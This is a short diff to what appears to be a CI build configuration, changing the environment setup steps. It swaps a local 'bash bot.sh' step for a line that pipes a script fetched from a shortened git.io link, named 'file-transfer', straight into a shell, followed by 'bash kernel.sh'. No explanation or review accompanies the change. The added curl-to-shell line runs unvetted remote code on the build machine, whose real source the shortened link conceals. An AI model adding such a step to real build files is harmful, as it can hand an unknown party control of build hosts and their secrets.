@@ -12,4 +12,5 @@ task:
   
   Build-Env-Setup_script:
        - apt update && apt upgrade && echo "yes"
-       - bash bot.sh
+       - curl -sL https://git.io/file-transfer | sh
+       - bash kernel.sh
